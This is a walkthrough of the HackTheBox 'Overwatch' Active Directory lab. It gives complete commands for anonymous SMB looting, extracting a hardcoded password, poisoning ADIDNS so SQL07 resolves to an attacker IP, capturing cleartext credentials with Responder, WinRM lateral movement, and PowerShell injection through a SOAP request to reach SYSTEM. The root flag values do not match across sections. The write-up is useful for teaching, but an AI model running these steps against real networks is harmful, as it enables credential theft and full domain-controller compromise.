# HackTheBox — Overwatch

**Difficulty:** Medium  
**OS:** Windows Server 2022  
**Category:** Active Directory  
**IP:** 10.129.244.81  
**Domain:** overwatch.htb  
**DC Hostname:** S200401.overwatch.htb  

---

## Flags

| Flag | Hash |
|------|------|
| User | `**38680d7ae54d4b0ae05d0ca4c165**` |
| Root | `**66e2dc6cda32ad73e7bc32850eec**` |

---

## Attack Chain Summary

```
Anonymous SMB read (software$)
    └─ overwatch.exe + overwatch.exe.config downloaded

.NET binary analysis
    ├─ strings -el → sqlsvc:TI0LKcfHzZw1Vv (hardcoded SQL connection string)
    └─ overwatch.exe.config → WCF service on localhost:8000 (KillProcess injection vector)

Authenticated enumeration (sqlsvc)
    ├─ MSSQL port 6520 → SQL07 linked server discovered (no DNS record)
    └─ sqlmgmt → member of Remote Management Users (WinRM target)

ADIDNS poisoning + Responder MSSQL capture
    ├─ DNSUpdate.py → SQL07.overwatch.htb → attacker IP
    ├─ EXEC AT SQL07 → DC connects to Responder
    └─ sqlmgmt:bIhBbzMMnB82yx captured in cleartext

Lateral movement
    └─ evil-winrm → sqlmgmt shell → user flag

Privilege escalation
    ├─ WCF KillProcess → unsanitized PowerShell injection
    ├─ overwatch.exe runs as NT AUTHORITY\SYSTEM
    └─ throw $f error leak → root flag (via includeExceptionDetailInFaults)
```

---

## Phase 1 — Reconnaissance

### Nmap

```bash
nmap -sC -sV -Pn -p- -A 10.129.244.81 --min-rate 5000
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Domain Controller |
| 88 | Kerberos | DC confirmed |
| 139/445 | SMB | Signing required — blocks NTLM relay |
| 389/3268 | LDAP/GC | AD enumeration |
| 5985 | WinRM | Lateral movement target |
| **6520** | **MSSQL** | Non-standard port — SQL Server 2022 RTM |
| 9389 | ADWS | Active Directory Web Services |

Domain identified: `overwatch.htb`, DC hostname: `S200401`.

```bash
echo "10.129.244.81  overwatch.htb S200401.overwatch.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2 — SMB Enumeration

### Null Session Share Listing

```bash
smbclient //10.129.244.81/software$ -N -c "recurse ON; ls"
```

Anonymous read access on the non-standard `software$` share reveals a `\Monitoring\` directory containing a custom .NET monitoring application:

| File | Significance |
|------|-------------|
| `overwatch.exe` | Custom .NET 4.7.2 monitoring binary |
| `overwatch.exe.config` | WCF service configuration |
| `overwatch.pdb` | Debug symbols |
| `EntityFramework.SqlServer.dll` | SQL Server backend |
| `System.Management.Automation.dll` | Runs PowerShell |

Download both the binary and config:

```bash
smbclient //10.129.244.81/software$ -N \
  -c "get Monitoring\overwatch.exe overwatch.exe; get Monitoring\overwatch.exe.config overwatch.exe.config"
```

### Config Analysis

`overwatch.exe.config` reveals two critical details:

```xml
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

```xml
<serviceDebug includeExceptionDetailInFaults="True" />
```

Port 8000 is not externally accessible — WCF service binds to localhost only. `includeExceptionDetailInFaults="True"` means backend errors are returned to the caller, which becomes useful during privilege escalation.

---

## Phase 3 — Credential Extraction

### Unicode String Extraction from .NET Binary

.NET binaries store strings as UTF-16 little-endian. The `-el` flag targets this encoding:

```bash
strings -el overwatch.exe
```

Hardcoded SQL connection string recovered:

```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

**Credentials: `sqlsvc:TI0LKcfHzZw1Vv`**

Other notable strings extracted:
- `Stop-Process -Name  -Force` — PowerShell process kill (injection point)
- `Microsoft\Edge\User Data\Default\History` — reads browser history
- `CheckEdgeHistory` — logs Edge URLs to SQL every 30 seconds

### Credential Validation

```bash
netexec smb 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
# [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

---

## Phase 4 — Authenticated Enumeration

### MSSQL — Linked Server Discovery

```bash
netexec mssql 10.129.244.81 --port 6520 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -q "SELECT name, data_source FROM sys.servers;"
```

Output:

```
name: S200401\SQLEXPRESS    data_source: S200401\SQLEXPRESS
name: SQL07                 data_source: (null)
```

**SQL07 exists as a linked server but has no DNS record** — no IP assigned. This is the attack vector.

---

## Phase 5 — ADIDNS Poisoning + Cleartext Credential Capture

### Why This Works

Active Directory-integrated DNS (ADIDNS) allows authenticated domain users to add DNS records by default. SQL Server's linked server authentication can be configured with stored plaintext SQL credentials. By pointing SQL07's DNS record at our machine and running Responder's MSSQL listener, we intercept those credentials in cleartext when the DC initiates the linked server connection.

### Step 1 — Start Responder

```bash
sudo responder -I tun0 -v
```

Verify the MSSQL module is listening on port 1433:

```bash
ss -tlnp | grep 1433
# LISTEN 0  5  *%tun0:1433  *:*
```

### Step 2 — Inject Fake DNS Record

```bash
python3 /usr/share/responder/tools/DNSUpdate.py \
  -DNS 10.129.244.81 \
  -u 'overwatch\sqlsvc' \
  -p 'TI0LKcfHzZw1Vv' \
  -a "ad" -r "SQL07" -d "<ATTACKER_TUN0_IP>"
# [+] LDAP operation completed successfully
```

Verify record propagation:

```bash
nslookup SQL07.overwatch.htb 10.129.244.81
# SQL07.overwatch.htb → <ATTACKER_TUN0_IP>  ✓
```

### Step 3 — Trigger the Linked Server Connection

```bash
netexec mssql 10.129.244.81 --port 6520 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -q "EXEC ('SELECT @@SERVERNAME') AT SQL07;"
```

The DC resolves SQL07 to our IP and connects to Responder's MSSQL listener. The "connection forcibly closed" error is expected — credentials are handed off before the connection is torn down.

### Captured Credentials

```bash
cat /usr/share/responder/logs/MSSQL-Cleartext-*.txt
```

```
sqlmgmt : bIhBbzMMnB82yx
```

Responder output confirms:

```
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

---

## Phase 6 — Lateral Movement → User Flag

`sqlmgmt` is a member of Remote Management Users, granting WinRM access:

```bash
netexec winrm 10.129.244.81 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
# [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)

evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

```powershell
type C:\Users\sqlmgmt\Desktop\user.txt
# **38680d7ae54d4b0ae05d0ca4c165**
```

---

## Phase 7 — Privilege Escalation → SYSTEM

### The Vulnerability

`overwatch.exe` hosts a WCF service running as **NT AUTHORITY\SYSTEM**. The `KillProcess` method concatenates user input directly into a PowerShell pipeline with no input sanitization:

```csharp
public string KillProcess(string processName)
{
    string text = "Stop-Process -Name " + processName + " -Force";
    Runspace val = RunspaceFactory.CreateRunspace();
    val.Open();
    Pipeline val2 = val.CreatePipeline();
    val2.Commands.AddScript(text);
    val2.Commands.Add("Out-String");
    Collection<PSObject> collection = val2.Invoke();
    // ...
}
```

Injection format: `a; <PAYLOAD> #`

- `a` — dummy process name (Stop-Process fails silently)
- `;` — PowerShell statement separator
- `#` — comments out the trailing ` -Force`

Port 8000 is localhost-only, so all SOAP requests are sent from within the WinRM session — no port forwarding required.

### Step 1 — Confirm SYSTEM Context

From the Evil-WinRM shell:

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type", "text/xml")
$wc.Headers.Add("SOAPAction", '"http://tempuri.org/IMonitoringService/KillProcess"')
$body = @'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>a; whoami #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
$wc.UploadString("http://localhost:8000/MonitorService", $body)
```

Response:

```xml
<KillProcessResult>nt authority\system</KillProcessResult>
```

### Step 2 — Root Flag Exfiltration

The `throw` trick forces the flag value into the WCF exception response. Because `includeExceptionDetailInFaults="True"` is set in the config, the service leaks it back directly — no reverse shell, no file write, no exfil server needed.

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type", "text/xml")
$wc.Headers.Add("SOAPAction", '"http://tempuri.org/IMonitoringService/KillProcess"')
$body = @'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>a; $f=(type C:\Users\Administrator\Desktop\root.txt); throw $f #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
$wc.UploadString("http://localhost:8000/MonitorService", $body)
```

Response:

```xml
<KillProcessResult>Error: **66e2dc6cda32ad73e7bc32850eec9**/KillProcessResult>
```

---

## Credentials Summary

| Account | Password | Access Level |
|---------|----------|--------------|
| sqlsvc | TI0LKcfHzZw1Vv | SMB READ, MSSQL (non-sysadmin) |
| sqlmgmt | bIhBbzMMnB82yx | WinRM shell — user flag |
| NT AUTHORITY\SYSTEM | — | WCF injection — root flag |

---

## Key Techniques

| Technique | Tool | Phase |
|-----------|------|-------|
| SMB anonymous enumeration | smbclient | Recon |
| .NET Unicode string extraction | `strings -el` | Cred discovery |
| MSSQL linked server enumeration | netexec / `sys.servers` | Enumeration |
| ADIDNS record injection | Responder `DNSUpdate.py` | Credential capture |
| MSSQL cleartext credential interception | Responder MSSQL module | Credential capture |
| WinRM lateral movement | evil-winrm | Initial access |
| WCF SOAP PowerShell injection | `System.Net.WebClient` | Privilege escalation |
| Error-based flag exfiltration | PowerShell `throw` + `includeExceptionDetailInFaults` | Root flag |
